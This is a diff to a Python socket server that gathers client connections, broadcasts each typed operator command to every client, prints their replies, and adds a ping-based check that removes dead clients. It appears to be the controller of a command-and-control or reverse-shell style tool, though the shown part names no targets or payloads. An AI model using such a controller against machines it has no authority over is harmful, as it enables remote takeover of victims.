@@ -84,29 +84,46 @@ def collect():
             all_address.append(address)
         except:
             print("Error accepting connections")
+
+def check(out=False,what=False):
+    while True:
+        c=0
+        for n,tcp in zip(all_address,all_connections):
+            c+=1
+            try:
+                tcp.send(str.encode("ping"))
+                if tcp.recv(1024).decode("utf-8"):
+                    if out:print(random.choice(co)(f'[+] {str(n[0])+":"+str(n[1]):<20} LIVE'))
+            except:
+                if out:print(random.choice(co)(f'[+] {str(n[0])+":"+str(n[1]):<20} DEAD'))
+                del all_address[c-1]
+                del all_connections[c-1]
+                continue
+        if what:break
 if __name__ == '__main__':
-	host = "127.0.0.1"
-	port = 9999
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.bind((host, port))
-	s.listen(50)
-	threading.Thread(target=collect).start()
-	while True:
-		cmd=input("->>")
-		if cmd:
-			if cmd == "list":
-				results = ''
-				for i, conn in enumerate(all_connections):
-					results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
-				print("----Clients----" + "\n" + results)
-			elif cmd=="help":
-				print(help)
-			else:
-				c=0
-				for n in all_connections:
-					cmd=str(cmd)
-					cmd=str.encode(cmd)
-					n.send(cmd)
-					print("[+] {} {}".format(all_address[c][0],n.recv(1024).decode("utf-8")))
-		else:
-			continue
+    host = "127.0.0.1"
+    port = 9999
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((host, port))
+    s.listen(50)
+    threading.Thread(target=collect).start()
+    threading.Thread(target=check).start()
+    while True:
+        cmd=input("->>")
+        if cmd:
+            if cmd == "list":
+                results = ''
+                for i, conn in enumerate(all_connections):
+                    results = results+random.choice(co)(f'{[i]}  {all_address[i][0]}:{all_address[i][1]} CONNECTED\n')
+                print("----Clients----" + "\n" + results)
+            elif cmd=="help":print(help)
+            elif cmd=="update":check(out=True,what=True)
+            else:
+                c=0
+                for n in all_connections:
+                    cmd=str(cmd)
+                    cmd=str.encode(cmd)
+                    n.send(cmd)
+                    print("[+] {}:{} {}".format(all_address[c][0],all_address[c][1],n.recv(1024).decode("utf-8")))
+        else:
+            continue
